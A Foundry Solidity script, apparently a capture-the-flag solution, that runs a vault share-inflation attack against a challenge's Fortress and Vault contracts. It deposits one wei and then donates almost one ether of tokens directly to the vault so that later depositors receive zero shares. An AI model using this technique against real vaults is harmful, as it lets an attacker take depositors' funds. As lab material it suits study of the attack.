// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";

interface IPhantomCoin {
    function buyTokens() external payable;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IVault {
    function deposit(uint256 _amount) external;
    function withdraw(uint256 _sharesAmount) external;
    function shares(address user) external view returns (uint256);
    function totalShares() external view returns (uint256);
    function owner() external view returns (address);
    function token() external view returns (address);
}

interface IFortress {
    function openVault() external returns (bool);
    function vault() external view returns (address);
    function token() external view returns (address);
    function owner() external view returns (address);
    function depositAmount() external view returns (uint256);
}

interface ISetup {
    function challenge() external view returns (address);
    function isSolved() external view returns (bool);
}

contract Exploit is Script {
    VmSafe.Wallet public solver;
    ISetup public chall;
    IPhantomCoin public coin;
    IFortress public fortress;
    IVault public vault;

    function setUp() public {
        chall = ISetup(payable(vm.envAddress("SETUP_CONTRACT")));
        fortress = IFortress(chall.challenge());
        vault = IVault(fortress.vault());
        coin = IPhantomCoin(fortress.token());

        solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));
    }

    function run() public {
        vm.startBroadcast(solver.privateKey);

        console.log("depositAmount:", fortress.depositAmount());

        coin.buyTokens{value: 1 ether}();
        console.log("token balance:", coin.balanceOf(solver.addr));
        coin.approve(address(vault), 1);

        vault.deposit(1);
        console.log("total shares:", vault.totalShares());
        console.log("vault balance:", coin.balanceOf(address(vault)));
        coin.transfer(address(vault), 1000000000000000000-1);

        require(chall.isSolved(), "Not Solved");

        vm.stopBroadcast();
    }

}
